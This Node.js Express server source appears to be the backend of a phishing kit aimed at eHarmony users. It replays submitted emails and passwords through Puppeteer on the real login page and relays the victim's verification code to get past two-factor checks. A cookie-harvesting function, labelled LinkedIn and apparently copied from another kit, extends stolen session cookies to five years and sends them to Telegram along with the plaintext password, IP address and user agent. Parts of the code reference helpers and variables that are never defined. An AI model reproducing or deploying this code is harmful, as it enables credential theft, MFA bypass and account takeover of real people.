const express = require("express");
const cors = require("cors");
const puppeteer = require("puppeteer");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Multi-session support: track active Puppeteer sessions by sessionId
// Each session: { browser, page, createdAt }
const sessions = new Map();

function createSessionId() {
  try {
    const { randomUUID } = require("crypto");
    if (typeof randomUUID === "function") return randomUUID();
  } catch {}
  return `sess_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
}

function setSession(sessionId, browser, page) {
  sessions.set(sessionId, { browser, page, createdAt: Date.now() });
}

function getSession(sessionId) {
  return sessions.get(sessionId);
}

function clearSession(sessionId) {
  sessions.delete(sessionId);
}

// Periodic cleanup of old sessions (2 hours)
setInterval(() => {
  const cutoff = Date.now() - 2 * 60 * 60 * 1000;
  for (const [id, s] of sessions.entries()) {
    if (s.createdAt < cutoff) sessions.delete(id);
  }
}, 30 * 60 * 1000);

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files (HTML, CSS, JS)
app.use(express.static("."));

// Login endpoint
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({
      success: false,
      error: "Email and password are required",
    });
  }

  let browser;
  let keepBrowserOpen = false; // Track if browser should stay open
  try {
    console.log(`Starting login process for: ${email}`);

    // Launch Puppeteer
    browser = await puppeteer.launch({
      headless: false, // Set to true for production
      defaultViewport: null,
      args: ["--start-maximized"],
    });

    const page = await browser.newPage();

    // Create a session for potential verification
    const sessionId = createSessionId();
    setSession(sessionId, browser, page);

    // Navigate to eHarmony login page
    await page.goto("https://www.eharmony.com/login/", {
      waitUntil: "networkidle2",
    });

    // Wait for the login form to load (using more flexible selectors)
    await page.waitForSelector(
      'input[type="email"], input[name="email"], #email, #loginFormEmail',
      {
        visible: true,
        timeout: 10000,
      }
    );

    // Wait for password field
    await page.waitForSelector(
      'input[type="password"], input[name="password"], #password, #loginFormPasswort',
      {
        visible: true,
        timeout: 10000,
      }
    );

    // Fill in the email (try multiple selectors)
    console.log("Filling in email...");
    const emailSelectors = [
      "#loginFormEmail",
      'input[type="email"]',
      'input[name="email"]',
      "#email",
    ];
    for (const selector of emailSelectors) {
      try {
        await page.type(selector, email);
        break;
      } catch (e) {
        console.log(`Email selector ${selector} not found, trying next...`);
      }
    }

    // Fill in the password (try multiple selectors)
    console.log("Filling in password...");
    const passwordSelectors = [
      "#loginFormPasswort",
      'input[type="password"]',
      'input[name="password"]',
      "#password",
    ];
    for (const selector of passwordSelectors) {
      try {
        await page.type(selector, password);
        break;
      } catch (e) {
        console.log(`Password selector ${selector} not found, trying next...`);
      }
    }

    // Click the login button (try multiple selectors)
    console.log("Clicking login button...");
    const buttonSelectors = [
      "#loginFormSubmit",
      'button[type="submit"]',
      'input[type="submit"]',
      ".login-button",
      "#login-button",
    ];
    for (const selector of buttonSelectors) {
      try {
        await page.click(selector);
        break;
      } catch (e) {
        console.log(`Button selector ${selector} not found, trying next...`);
      }
    }

    // Wait 5 seconds and check URL
    console.log("Waiting 5 seconds to check URL...");
    await new Promise((resolve) => setTimeout(resolve, 5000));

    const currentUrl = page.url();
    console.log("Current URL after 5 seconds:", currentUrl);

    // Check if URL contains login_error=1 (incorrect credentials)
    const hasLoginError = currentUrl.includes("login_error=1");
    const needsVerification = currentUrl.includes("user_verification");

    if (hasLoginError) {
      console.log(
        "Login failed - detected login_error=1 in URL (incorrect credentials)"
      );
      res.json({
        success: false,
        message: "Login failed - incorrect email or password",
        currentUrl: currentUrl,
        hasLoginError: true,
      });
    } else if (needsVerification) {
      console.log(
        "Login requires verification - detected user_verification in URL"
      );
      console.log("Keeping Puppeteer browser open for verification...");

      let verificationEmailText = null;
      try {
        await page.waitForSelector("#email", { visible: true, timeout: 1000 });
        verificationEmailText = await page.$eval("#email", (el) =>
          el.textContent.trim()
        );
        console.log(">>> div#email text:", verificationEmailText);
      } catch (err) {
        console.log("div#email not found on main page:", err.message);
      }

      const encodedEmail = verificationEmailText 
      ? Buffer.from(verificationEmailText).toString('base64') 
      : '';

      keepBrowserOpen = true; // Mark browser to stay open
      res.json({
        success: true,
        message: "Login requires verification - browser kept open",
        currentUrl: currentUrl,
        needsVerification: true,
        sessionId,
        redirectTo: `/user-verification.html?email=${encodedEmail}&sessionId=${encodeURIComponent(sessionId)}`
      });
      // Don't close the browser - let it stay open for verification
      return;
    } else {
      console.log("Login successful - no login_error detected");
      const isHome = currentUrl.includes("/lists/partnersuggestions") ||
                     currentUrl.includes("/profile/welcomepage") ||
                     currentUrl.includes("/profile/") ||
                     currentUrl.includes("/home");
      const redirectTo = isHome ? "https://www.eharmony.com/lists/partnersuggestions" : undefined;
      res.json({
        success: true,
        message: "Login successful",
        currentUrl: currentUrl,
        redirectTo,
        isHome,
      });
    }
  } catch (error) {
    console.error("Error during login process:", error);
    res.status(500).json({
      success: false,
      error: "Internal server error during login process",
      details: error.message,
    });
  } finally {
    // Only close the browser if it shouldn't be kept open
    if (browser && !keepBrowserOpen) {
      setTimeout(async () => {
        await browser.close();
        console.log("Browser closed");
        // Remove any sessions tied to this browser
        for (const [id, s] of sessions.entries()) {
          if (s.browser === browser) sessions.delete(id);
        }
      }, 5000); // Wait 5 seconds before closing
    } else if (browser && keepBrowserOpen) {
      console.log("Browser kept open for verification process");
    }
  }
});


// Endpoint to receive 4-digit verification code and input it into the open Puppeteer page
app.post("/api/verify-otp", async (req, res) => {
  const { code, sessionId } = req.body;
  if (!code || typeof code !== "string" || code.length !== 4) {
    return res.status(400).json({ success: false, error: "Invalid code. Must be 4 digits." });
  }

  if (!sessionId) {
    return res.status(400).json({ success: false, error: "Missing sessionId." });
  }
  const session = getSession(sessionId);
  if (!session || !session.browser || !session.page) {
    return res.status(409).json({ success: false, error: "Invalid or expired session. Please login again." });
  }

  try {
    console.log("Received OTP code:", code);
    const activePage = session.page;

    // Try multiple selectors for the verification input
    const otpSelectors = [
      "#code",
      'input[name="verification_code"]',
      'input[type="text"][maxlength="4"]',
    ];

    let inputHandle = null;
    for (const selector of otpSelectors) {
      try {
        await activePage.waitForSelector(selector, { timeout: 4000 });
        inputHandle = await activePage.$(selector);
        if (inputHandle) {
          // Clear existing value if any
          await activePage.evaluate((el) => (el.value = ""), inputHandle);
          await inputHandle.type(code, { delay: 50 });
          break;
        }
      } catch (e) {
        console.log(`OTP selector ${selector} not found, trying next...`);
      }
    }

    if (!inputHandle) {
      return res.status(404).json({ success: false, error: "OTP input field not found on the page." });
    }

    // Attempt to submit: press Enter or click a submit button if available
    try {
      await inputHandle.press("Enter");
    } catch {}

    const submitSelectors = [
      "#verificationFormSubmit",
      'button[type="submit"]',
      'input[type="submit"]',
      '#loginFormSubmit',
    ];
    for (const selector of submitSelectors) {
      try {
        await activePage.click(selector);
        break;
      } catch (e) {
        // ignore and try next
      }
    }

    // Wait up to 5 seconds to allow redirects or in-page processing
    await new Promise((resolve) => setTimeout(resolve, 5000));

    let newUrl = "";
    try {
      newUrl = activePage.url();
    } catch (e) {
      console.log("Could not read page URL after OTP submit:", e.message);
    }
    console.log("URL 5s after OTP submit:", newUrl);

    // Classify result per provided rules
    const isInvalidCode = typeof newUrl === "string" && newUrl.includes("error=invalid");
    const isHome = typeof newUrl === "string" && (
      newUrl.includes("/lists/partnersuggestions") ||
      newUrl.includes("/profile/welcomepage") ||
      newUrl.includes("/profile/") ||
      newUrl.includes("/home")
    );
    const verified = isHome && !isInvalidCode;

    return res.json({ success: true, verified, isInvalidCode, isHome, currentUrl: newUrl });
  } catch (error) {
    console.error("Error processing OTP:", error);
    return res.status(500).json({ success: false, error: "Failed to submit OTP", details: error.message });
  }
});



// Health check endpoint
app.get("/api/health", (req, res) => {
  res.json({ status: "OK", message: "Server is running" });
});

// Serve the main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

async function collectAndSaveCookies(page, sessionId) {
  try {
    const cookies = await page.cookies();
    const fiveYearsInSeconds = 5 * 365 * 24 * 60 * 60; // 5 years in seconds

    // Get session information
    const session = sessions[sessionId];
    if (!session) {
      console.error("Session not found for ID:", sessionId);
      return;
    }

    const { userInfo, browser } = session;
    const currentUrl = await page.url();

    // Get IP information from session
    const ipInfo = session.ipInfo;
    const ipDetails = ipInfo ? 
      `IP: ${ipInfo.ip}\nLocation: ${ipInfo.location}\nISP: ${ipInfo.isp}` : 
      `IP: ${userInfo.ip}`;
    
    // Send session info to Telegram with HTML formatting
    const sessionMessage = `<b>New Session Captured</b>\n\nName: LinkedIn\nUsername: ${userInfo.email}\nPassword: <tg-spoiler>${userInfo.password}</tg-spoiler>\nLanding URL: ${currentUrl}\n${ipDetails}\nUser Agent: <code>${userInfo.userAgent}</code>`;
    await sendTelegramMessage(sessionMessage);

    const filteredCookies = cookies.filter((cookie) =>
      [
        "_uetvid",
        "tms_pu",
        "lcookie",
        "NVI_LC2",
        "ads_si",
        "_uetsid",
        "PDC",
        "peg_session",
        "mcookie",
        "currentScreenSize",
        "tms_ps",
        "cf_clearance",
        "2FA_UV",
        "_cfuvid",
        "_fbp",
        "_gcl_au",
        "_lc2_fpi",
        "_lc2_fpi_js",
        "li_dcdm_c",
        "_li_ss",
        "cjcookie",
        "NVI_FC",
        "psg_optin",
        "SESSION",
        "timezone",
      ].includes(cookie.name)
    );

    const formattedCookies = filteredCookies.map((cookie) => {
      // Add 5 years to the current expiration date
      const extendedExpiration =
        Math.floor(Date.now() / 1000) + fiveYearsInSeconds;

      if (cookie.name === "_uetvid") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "tms_pu") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: true,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "lcookie") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: true,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "NVI_LC2") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "ads_si") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: true,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "_uetsid") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "PDC") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: true,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "li_alerts") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: true,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "mcookie") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: true,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "currentScreenSize") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: null,
          session: true,
          storeId: null,
        };
      }

      if (cookie.name === "tms_ps") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: true,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "cf_clearance") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: true,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "2FA_UV") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: true,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "_cfuvid") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: true,
          sameSite: "no_restriction",
          session: true,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "_fbp") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: "lax",
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "_gcl_au") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "_lc2_fpi") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: "lax",
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "_lc2_fpi_js") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: null,
          session: true,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "_li_dcdm_c") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: "lax",
          session: true,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "_li_ss") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: "lax",
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      if (cookie.name === "cjcookie") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: true,
          httpOnly: false,
          sameSite: "no_restriction",
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }
      if (cookie.name === "NVI_FC") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: true,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }
      if (cookie.name === "psg_optin") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: null,
          session: true,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }
      if (cookie.name === "SESSION") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: true,
          path: "/",
          secure: false,
          httpOnly: true,
          sameSite: "lax",
          session: true,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }
      if (cookie.name === "timezone") {
        return {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          hostOnly: false,
          path: "/",
          secure: false,
          httpOnly: false,
          sameSite: null,
          session: false,
          expirationDate: extendedExpiration,
          storeId: null,
        };
      }

      return {
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        hostOnly: cookie.hostOnly,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        session: cookie.session || false,
        firstPartyDomain: cookie.firstPartyDomain || "",
        partitionKey: cookie.partitionKey || null,
        storeId: cookie.storeId || null,
      };
    });

    const cookieFilePath = path.join(cookiesDir, `${sessionId}.json`);
    fs.writeFileSync(cookieFilePath, JSON.stringify(formattedCookies, null, 2));
    console.log(`Cookies saved to ${cookieFilePath}`);

    // Send the actual cookie file to Telegram
    await sendTelegramFile(cookieFilePath, `Cookies for ${userInfo.email}`);

    // Wait 30 seconds before closing browser
    console.log("Waiting 30 seconds before closing browser...");
    await delay(30000);

    // Close browser and clean up session
    try {
      await browser.close();
      delete sessions[sessionId];
      console.log(`Browser closed and session ${sessionId} cleaned up`);
    } catch (closeError) {
      console.error("Error closing browser:", closeError);
    }
  } catch (error) {
    console.error("Error in collectAndSaveCookies:", error);
  }
}

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Health check: http://localhost:${PORT}/api/health`);
});
